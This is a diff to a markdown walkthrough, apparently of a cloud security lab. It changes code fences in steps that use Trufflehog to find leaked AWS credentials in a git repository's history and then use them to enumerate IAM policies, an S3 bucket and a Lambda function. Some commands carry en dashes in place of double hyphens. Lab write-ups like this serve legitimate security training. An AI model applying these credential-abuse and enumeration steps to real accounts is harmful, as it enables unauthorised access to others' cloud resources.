@@ -17,12 +17,12 @@
 
 ## PROCEDURE : ##
 First, we use Trufflehog to look through the git repository:
-```
+```console
 ~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts.git
 ```
 
 The first result it gives us indicates that AWS credentials have been detected in a file called **`put_policy.py`** but it’s not in the latest commit.
-```
+```console
 Found unverified result 🐷🔑❓
 Detector Type: AWS
 Decoder Type: PLAIN
@@ -53,43 +53,43 @@ index d78760f..f7013a9 100644
 All we need to do know is configure these credentials by running `aws configure` and running `aws sts get-caller-identity`.
  
 From the output we can see that our username is `haug` and we can plug this in the next command to get the list of attached user policies:
-```
+```console
 $ aws iam list-attached-user-policies --user-name haug
 ```
 We now know that our policy’s arn is `arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY`.
 
 We can use this to get the policy assigned to our user by running:
-```
+```console
 $ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY
 ```
 
 Similarly to view the default version of this policy we can use:
-```
+```console
 $ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1
 ```
 
 Now to list inline user policies associated with the username `haug` we use:
-```
+```console
 $ aws iam list-user-policies –user-name haug
 ```
 
 With this we see that the policy Name is `S3Perms` and we can use this to retrieve haug’s user policy:
-```
+```console
 $ aws iam get-user-policy –user-name haug –policy-name S3Perms
 ```
 
 This discloses the name of a S3 bucket called `smogmachines3`.  We can use this to list objects in this bucket by using:
-```
+```console
 $ aws s3api list-objects –bucket smogmachines3
 ```
 
 To list the lambda privileges that attached user policy is providing us with, we can use:
-```
+```console
 $ aws lambda list-functions
 ```
 
 This shows us a function called `smogmachine_lambda`.  Let’s see whether this is directly accessible through a public URL:
-```
+```console
 $ aws lambda get-function-url-config --function-name smogmachine_lambda
 ```
 
